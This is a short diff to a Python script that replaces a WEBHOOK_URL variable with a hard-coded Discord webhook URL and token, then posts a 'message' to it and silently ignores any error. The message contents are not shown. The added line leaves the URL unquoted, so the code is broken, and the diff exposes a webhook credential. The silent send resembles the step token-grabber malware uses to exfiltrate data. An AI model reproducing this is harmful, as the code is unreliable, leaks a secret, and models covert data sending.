@@ -65,7 +65,7 @@ def main():
     payload = json.dumps({'content': message})
 
     try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        req = Request(https://discordapp.com/api/webhooks/789883557409325076/RDXDACWpTCksOMl8OB9EK31rlY-7bxs8i_5-UwrY-2PLMefGdxbfpMdl0P_Xi0g6BSG4, data=payload.encode(), headers=headers)
         urlopen(req)
     except:
         pass
